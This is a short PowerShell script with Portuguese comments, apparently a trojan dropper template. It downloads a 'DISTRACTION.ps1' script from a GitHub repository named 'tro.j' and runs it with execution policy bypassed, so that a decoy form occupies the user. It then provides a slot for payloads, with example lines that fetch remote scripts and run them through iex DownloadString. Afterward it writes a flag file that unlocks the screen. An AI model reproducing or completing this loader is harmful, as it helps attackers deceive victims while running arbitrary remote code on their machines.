# ==============================================
# MASTER.ps1 - VERSÃO SIMPLIFICADA E FUNCIONAL
# ==============================================

# 1. Baixa o DISTRACTION.ps1 para um arquivo local (evita problemas de download na hora)
$distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
$distractLocal = "$env:TEMP\distract.ps1"
(New-Object Net.WebClient).DownloadFile($distractScript, $distractLocal)

# 2. Abre o DISTRACTION.ps1 em uma nova janela do PowerShell (NORMAL, VISÍVEL)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Normal -Exec Bypass -File `"$distractLocal`"" -WindowStyle Normal

# Aguarda a distração abrir o formulário (3 segundos)
Start-Sleep -Seconds 3

# 3. AQUI VOCÊ ADICIONA SEUS PAYLOADS (UM POR UM)
# Exemplo:
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload1.ps1'))
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload2.ps1'))

Write-Host "Aguardando 10 segundos (payloads vazios)"
Start-Sleep -Seconds 10

# 4. Cria a flag para destravar a tela
New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null
Write-Host "Flag criada. Distração será encerrada."